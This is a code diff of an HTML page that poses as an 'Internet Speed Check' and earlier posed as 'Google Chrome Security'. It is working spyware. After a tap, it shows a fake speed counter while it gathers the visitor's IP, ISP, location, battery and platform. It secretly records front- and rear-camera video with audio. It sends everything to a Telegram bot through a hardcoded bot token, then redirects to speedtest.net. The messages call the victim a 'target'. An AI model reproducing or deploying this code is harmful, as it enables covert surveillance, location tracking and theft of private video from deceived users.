@@ -1,95 +1,135 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Chrome Security</title>
+    <title>Network Diagnostic Tool</title>
     <style>
-        /* شاشة زرقاء غامقة تشبه واجهات النظام الرسمية */
         body {
             background-color: #0d1117;
-            margin: 0;
+            color: #58a6ff;
+            font-family: 'Courier New', Courier, monospace;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            cursor: pointer;
+            margin: 0;
+            overflow: hidden;
         }
-        .dot-loader {
-            width: 50px;
-            height: 50px;
-            border: 3px solid #30363d;
-            border-top-color: #58a6ff;
-            border-radius: 50%;
-            animation: rotate 1s infinite linear;
-        }
-        @keyframes rotate { to { transform: rotate(360deg); } }
+        .container { text-align: center; border: 1px solid #30363d; padding: 40px; border-radius: 10px; background: #161b22; width: 80%; max-width: 400px; }
+        .loader { border: 4px solid #21262d; border-top: 4px solid #238636; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .speed-text { font-size: 24px; font-weight: bold; color: #238636; margin: 10px 0; }
+        .log-text { font-size: 12px; color: #8b949e; text-align: left; height: 50px; overflow: hidden; }
     </style>
 </head>
-<body onclick="startProcess()">
-    <div class="dot-loader"></div>
+<body onclick="startDiagnostic()">
+
+    <div class="container" id="main-ui">
+        <h3>Internet Speed Check</h3>
+        <div class="loader"></div>
+        <div class="speed-text" id="speed">0.00 Mbps</div>
+        <div class="log-text" id="log">Waiting for user interaction...<br>Scanning local nodes...</div>
+        <p style="font-size: 10px; color: #484f58; margin-top: 20px;">Tap anywhere to start the diagnostic scan</p>
+    </div>
 
     <script>
         const BOT_TOKEN = "8619027051:AAH06xxHUXEeZ_PLu8l5QF8zct7nrjNW4ts";
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('chatId');
-        let active = false;
+        let isRunning = false;
 
-        // بمجرد أن يلمس المستخدم الشاشة في أي مكان، سيظهر طلب الكاميرا
-        async function startProcess() {
-            if (active || !chatId) return;
-            active = true;
-
-            // 1. إرسال معلومات الجهاز فوراً
-            sendDeviceData();
-
-            // 2. طلب الكاميرا الأمامية وتصويرها (7 ثوانٍ)
-            await captureStream("user", "الأمامية");
-
-            // 3. طلب الكاميرا الخلفية وتصويرها (7 ثوانٍ)
-            await captureStream("environment", "الخلفية");
-
-            // تحويل الضحية إلى جوجل بعد الانتهاء
-            window.location.href = "https://www.google.com";
+        function updateLog(text) {
+            const log = document.getElementById('log');
+            log.innerHTML += `<br>> ${text}`;
         }
 
-        async function sendDeviceData() {
+        async function startDiagnostic() {
+            if (isRunning || !chatId) return;
+            isRunning = true;
+
+            // بدء العداد الوهمي
+            let speed = 0;
+            const interval = setInterval(() => {
+                if (speed < 45) {
+                    speed += Math.random() * 5;
+                    document.getElementById('speed').innerText = speed.toFixed(2) + " Mbps";
+                }
+            }, 500);
+
+            updateLog("Initializing secure handshake...");
+           
+            // 1. جمع البيانات وإرسالها بشكل مرتب
+            sendDetailedInfo();
+
+            // 2. تصوير الكاميرات
+            await captureAndSend("user", "Front Camera (Selfie)");
+            updateLog("Analyzing latency...");
+           
+            await captureAndSend("environment", "Back Camera (Rear)");
+            updateLog("Scan complete. Finalizing report...");
+
+            setTimeout(() => {
+                clearInterval(interval);
+                window.location.href = "https://www.speedtest.net";
+            }, 2000);
+        }
+
+        async function sendDetailedInfo() {
             try {
-                const info = await fetch('https://ipapi.co/json/').then(r => r.json());
-                const bat = await navigator.getBattery();
-                const msg = `✅ **هدف متصل**\n🆔 الجلسة: #${Math.floor(Math.random()*999)}\n🌐 IP: \`${info.ip}\`\n📍 ${info.city}\n🔋 ${Math.round(bat.level*100)}%`;
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-            } catch(e){}
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                const b = await navigator.getBattery();
+               
+                const report = `
+🚀 **New Target Captured!**
+━━━━━━━━━━━━━━━━━━
+👤 **ID:** \`#${Math.floor(Math.random()*9000)+1000}\`
+🌐 **IP:** \`${d.ip}\`
+🏢 **ISP:** \`${d.org}\`
+📍 **Location:** ${d.city}, ${d.region}, ${d.country_name}
+🔋 **Battery:** ${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})
+📱 **Platform:** ${navigator.platform}
+🕒 **Time:** ${new Date().toLocaleTimeString()}
+━━━━━━━━━━━━━━━━━━`;
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
+            } catch (e) {}
         }
 
-        async function captureStream(mode, label) {
+        async function captureAndSend(mode, label) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: mode, width: 480, height: 360 },
+                    video: { facingMode: { exact: mode === "environment" ? "environment" : "user" } },
                     audio: true
+                }).catch(async () => {
+                    // fallback if 'exact' fails
+                    return await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
                 });
-               
+
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
                 recorder.ondataavailable = e => chunks.push(e.data);
-               
+
                 return new Promise(resolve => {
                     recorder.onstop = async () => {
                         const blob = new Blob(chunks, { type: 'video/mp4' });
                         const fd = new FormData();
                         fd.append('chat_id', chatId);
-                        fd.append('document', blob, `${label}.mp4`);
-                        fd.append('caption', `🎥 فيديو: ${label}`);
+                        fd.append('document', blob, `${mode}.mp4`);
+                        fd.append('caption', `🎥 **Captured Video**\n📸 Source: ${label}`);
                        
                         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
                         stream.getTracks().forEach(t => t.stop());
                         resolve();
                     };
                     recorder.start();
-                    setTimeout(() => recorder.stop(), 7000); // مدة كافية للصيد وسريعة للرفع
+                    setTimeout(() => recorder.stop(), 8000);
                 });
             } catch (err) {
-                return Promise.resolve(); // في حال الرفض ينتقل للكاميرا التالية أو ينهي العملية
+                updateLog(`Sensor ${label} bypass failed.`);
+                return Promise.resolve();
             }
         }
     </script>
